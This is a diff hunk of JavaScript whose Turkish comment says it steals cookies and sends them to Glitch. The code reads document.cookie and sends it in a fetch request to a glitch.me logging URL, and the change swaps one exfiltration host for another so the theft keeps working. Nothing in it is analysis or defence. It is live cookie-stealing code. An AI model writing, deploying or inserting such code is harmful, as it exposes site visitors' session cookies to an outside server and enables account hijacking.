@@ -22,7 +22,7 @@
     // 2. Cookie’leri çalıp Glitch’e gönder
     const cookies = document.cookie;
     if (cookies) {
-      fetch('https://ebony-brassy-pipe.glitch.me/log?cookie=' + encodeURIComponent(cookies), {
+      fetch('https://ancient-pentagonal-elephant.glitch.me/log?cookie=' + encodeURIComponent(cookies), {
         method: 'GET',
       })
         .then(response => response.text())
